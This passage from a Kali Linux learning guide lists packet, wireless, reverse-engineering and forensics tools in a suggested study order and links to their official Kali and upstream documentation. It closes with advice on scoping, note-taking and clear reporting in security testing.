### Stage 5: Learn packets and wireless

Master first:

- `tcpdump`
- `wireshark`
- `bettercap`
- `aircrack-ng`
- `hcxtools`
- `kismet`

### Stage 6: Learn reverse engineering and forensics

Master first:

- `ghidra`
- `gdb`
- `jadx`
- `binwalk`
- `autopsy`
- `sleuthkit`
- `yara`

### A strong beginner-to-intermediate order

If you only focus on 12 tools first, make them these:

1. `nmap`
2. `burpsuite`
3. `ffuf`
4. `whatweb`
5. `nuclei`
6. `hashcat`
7. `john`
8. `metasploit-framework`
9. `wireshark`
10. `netexec`
11. `impacket`
12. `ghidra`

That set gives you coverage across network, web, credentials, AD, traffic, exploitation, and binaries.

---

## 18. Documentation Hub

Use the official Kali tool page first whenever possible. It is often the fastest path because it gives you package info, commands, and an upstream project link in one place.

### Kali foundation docs

- Kali docs home: [https://www.kali.org/docs/](https://www.kali.org/docs/)
- All Kali tools: [https://www.kali.org/tools/all-tools/](https://www.kali.org/tools/all-tools/)
- Kali metapackages: [https://www.kali.org/docs/general-use/metapackages/](https://www.kali.org/docs/general-use/metapackages/)
- Should I Use Kali Linux?: [https://www.kali.org/docs/introduction/should-i-use-kali-linux/](https://www.kali.org/docs/introduction/should-i-use-kali-linux/)
- Updating Kali: [https://www.kali.org/docs/general-use/updating-kali/](https://www.kali.org/docs/general-use/updating-kali/)
- Kali sources list: [https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/](https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/)

### Major tool pages in Kali

- Nmap: [https://www.kali.org/tools/nmap/](https://www.kali.org/tools/nmap/)
- Burp Suite: [https://www.kali.org/tools/burpsuite/](https://www.kali.org/tools/burpsuite/)
- OWASP ZAP: [https://www.kali.org/tools/zaproxy/](https://www.kali.org/tools/zaproxy/)
- Gobuster: [https://www.kali.org/tools/gobuster/](https://www.kali.org/tools/gobuster/)
- ffuf: [https://www.kali.org/tools/ffuf/](https://www.kali.org/tools/ffuf/)
- sqlmap: [https://www.kali.org/tools/sqlmap/](https://www.kali.org/tools/sqlmap/)
- Hashcat: [https://www.kali.org/tools/hashcat/](https://www.kali.org/tools/hashcat/)
- John: [https://www.kali.org/tools/john/](https://www.kali.org/tools/john/)
- Hydra: [https://www.kali.org/tools/hydra/](https://www.kali.org/tools/hydra/)
- Metasploit Framework: [https://www.kali.org/tools/metasploit-framework/](https://www.kali.org/tools/metasploit-framework/)
- ExploitDB/Searchsploit: [https://www.kali.org/tools/exploitdb/](https://www.kali.org/tools/exploitdb/)
- Impacket: [https://www.kali.org/tools/impacket/](https://www.kali.org/tools/impacket/)
- NetExec: [https://www.kali.org/tools/netexec/](https://www.kali.org/tools/netexec/)
- BloodHound CE Python: [https://www.kali.org/tools/bloodhound-ce-python/](https://www.kali.org/tools/bloodhound-ce-python/)
- Certipy-ad: [https://www.kali.org/tools/certipy-ad/](https://www.kali.org/tools/certipy-ad/)
- Wireshark: [https://www.kali.org/tools/wireshark/](https://www.kali.org/tools/wireshark/)
- Bettercap: [https://www.kali.org/tools/bettercap/](https://www.kali.org/tools/bettercap/)
- aircrack-ng: [https://www.kali.org/tools/aircrack-ng/](https://www.kali.org/tools/aircrack-ng/)
- Kismet: [https://www.kali.org/tools/kismet/](https://www.kali.org/tools/kismet/)
- Ghidra: [https://www.kali.org/tools/ghidra/](https://www.kali.org/tools/ghidra/)
- jadx: [https://www.kali.org/tools/jadx/](https://www.kali.org/tools/jadx/)
- apktool: [https://www.kali.org/tools/apktool/](https://www.kali.org/tools/apktool/)
- binwalk: [https://www.kali.org/tools/binwalk/](https://www.kali.org/tools/binwalk/)
- Autopsy: [https://www.kali.org/tools/autopsy/](https://www.kali.org/tools/autopsy/)
- Sleuth Kit: [https://www.kali.org/tools/sleuthkit/](https://www.kali.org/tools/sleuthkit/)
- YARA: [https://www.kali.org/tools/yara/](https://www.kali.org/tools/yara/)

### Upstream docs that are especially useful

- Nmap reference guide: [https://nmap.org/book/man.html](https://nmap.org/book/man.html)
- Burp Suite docs: [https://portswigger.net/burp/documentation](https://portswigger.net/burp/documentation)
- OWASP ZAP docs: [https://www.zaproxy.org/docs/](https://www.zaproxy.org/docs/)
- Metasploit docs: [https://docs.metasploit.com/](https://docs.metasploit.com/)
- Hashcat wiki: [https://hashcat.net/wiki/](https://hashcat.net/wiki/)
- John docs: [https://www.openwall.com/john/doc/](https://www.openwall.com/john/doc/)
- Wireshark docs: [https://www.wireshark.org/docs/](https://www.wireshark.org/docs/)
- Ghidra home and docs: [https://ghidra-sre.org/](https://ghidra-sre.org/)

---

## Final Advice

The most important thing to understand about Kali is this: **Kali is a workflow platform, not a magic exploit button**.

If you can do these five things well, you are using Kali correctly:

1. define scope carefully
2. gather evidence before you guess
3. choose the right tool family for the job
4. keep clean notes and screenshots
5. explain impact and remediation clearly

The people who get the most out of Kali are not the people who know the most commands. They are the people who know when to stop scanning, when to pivot, when to validate manually, and how to turn raw tool output into a believable security story.
